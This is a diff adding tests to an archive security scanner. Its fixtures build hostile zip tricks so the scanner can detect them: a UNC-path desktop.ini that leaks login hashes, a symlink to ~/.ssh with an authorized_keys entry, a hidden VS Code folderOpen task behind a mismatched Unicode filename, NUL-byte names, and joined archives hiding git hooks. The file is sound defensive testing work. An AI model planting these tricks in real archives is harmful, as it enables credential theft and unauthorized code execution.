@@ -2,8 +2,10 @@
 attack patterns; nothing here is ever extracted or executed."""
 import io
 import json
+import struct
 import time
 import zipfile
+import zlib
 from pathlib import Path
 
 import rules
@@ -148,6 +150,37 @@ def test_double_extension_executable():
     assert not any(x.path == "notes.txt" for x in f)
 
 
+def test_windows_shell_files_that_leak_login_hashes():
+    bs = chr(92)  # backslash, built at runtime so no escaping layer can mangle the UNC path
+    unc_ini = f"[.ShellClassInfo]{chr(10)}IconResource={bs * 2}10.0.0.5{bs}share{bs}x.ico,0"
+    f = scan({"a.library-ms": "<libraryDescription/>", "b.searchConnector-ms": "<searchConnectorDescription/>",
+              "c.scf": "[Shell]", "d.url": "[InternetShortcut]", "e/desktop.ini": unc_ini,
+              "f/desktop.ini": "[.ShellClassInfo]\nIconResource=//10.0.0.5/share/x.ico,0",
+              "g/desktop.ini": f"[.ShellClassInfo]{chr(10)}IconResource=C:{bs}Windows{bs}x.ico,0",
+              "h/desktop.ini": "[.ShellClassInfo]\nInfoTip=see https://example.invalid/help"})
+    for p in ("a.library-ms", "b.searchConnector-ms", "c.scf", "d.url"):
+        assert has(f, HIGH, p, "windows shell file"), p
+    assert has(f, HIGH, "e/desktop.ini", "network path") and has(f, HIGH, "f/desktop.ini", "network path")
+    assert not any(x.path in ("g/desktop.ini", "h/desktop.ini") for x in f)  # local icon, web link: normal
+
+
+def test_symlink_entries_are_high():
+    link = zipfile.ZipInfo("link")
+    link.external_attr = 0o120777 << 16  # Unix symlink mode
+    regular = zipfile.ZipInfo("script.txt")
+    regular.external_attr = 0o100644 << 16  # Unix regular file mode
+    f = scan(make_zip({link: "/home/user/.ssh", "link/authorized_keys": "key", regular: "hello"}))
+    assert has(f, HIGH, "link", "symbolic link to '/home/user/.ssh'")
+    assert not any(x.path == "script.txt" for x in f)
+
+
+def test_less_common_executable_types():
+    exts = (".xll", ".appref-ms", ".application", ".settingcontent-ms", ".msp", ".wsh")
+    f = scan({f"report{ext}": "plain text" for ext in exts})
+    for ext in exts:
+        assert has(f, HIGH, f"report{ext}", "executable"), ext
+
+
 def test_rtl_override_name():
     f = scan({"invoice\u202efdp.exe": "text"})
     assert has(f, HIGH, "invoice\u202efdp.exe", "right-to-left")
@@ -271,6 +304,39 @@ def test_disguised_nested_zips_are_scanned():
     assert has(f, HIGH, "inner.zip!/.git/hooks/post-checkout", "hook")
     assert has(f, HIGH, "photo.png!/.git/hooks/post-checkout", "hook")
     assert has(f, HIGH, "fake.zip", "corrupted")
+
+
+def zip_with_unicode_path_field(plain, unicode_name, content):
+    """Entry whose plain name differs from its Info-ZIP Unicode Path extra field (0x7075)."""
+    zi = zipfile.ZipInfo(plain)
+    zi.extra = (struct.pack("<HHB", 0x7075, 5 + len(unicode_name.encode()), 1)
+                + struct.pack("<L", zlib.crc32(plain.encode())) + unicode_name.encode())
+    return make_zip({zi: content})
+
+
+def test_entries_with_two_names_are_checked_under_both():
+    # Runs on 3.11 too, where zipfile ignores the Unicode-path field and only our own parser sees it.
+    task = '{"runOptions":{"runOn":"folderOpen"}}'
+    for plain, unicode_name in ((".vscode/tasks.json", "readme.txt"), ("readme.txt", ".vscode/tasks.json")):
+        f = scan(zip_with_unicode_path_field(plain, unicode_name, task))
+        assert has(f, HIGH, ".vscode/tasks.json", "folderOpen"), plain
+        assert any("more than one name" in x.reason for x in f), plain
+    # a NUL byte in the name: zipfile cuts it to "evil.exe", other tools may not
+    f = scan(make_zip({"evil.exe_.txt": "x"}).replace(b"evil.exe_.txt", b"evil.exe\0.txt"))
+    assert has(f, HIGH, "evil.exe", "executable")
+    assert any("more than one name" in x.reason for x in f)
+    assert not any("more than one name" in x.reason for x in scan({"normal/file.txt": "x"}))
+
+
+def test_joined_zips_scan_the_first_archive_too():
+    evil = make_zip({"repo/.git/hooks/post-checkout": "echo test"})
+    benign = make_zip({"README.md": "hello"})
+    f = scan(evil + benign)
+    assert has(f, HIGH, "test.zip", "two zip archives joined")
+    assert has(f, HIGH, "(first archive)!/repo/.git/hooks/post-checkout", "hook")
+    f = scan({"inner.zip": evil + benign})  # same trick one level down
+    assert has(f, HIGH, "inner.zip!/(first archive)!/repo/.git/hooks/post-checkout", "hook")
+    assert not any("joined" in x.reason for x in scan(b"MZ self-extractor stub" + benign))  # plain prefix: not a zip
 
 
 def test_nested_zip_over_size_cap_is_high(monkeypatch):
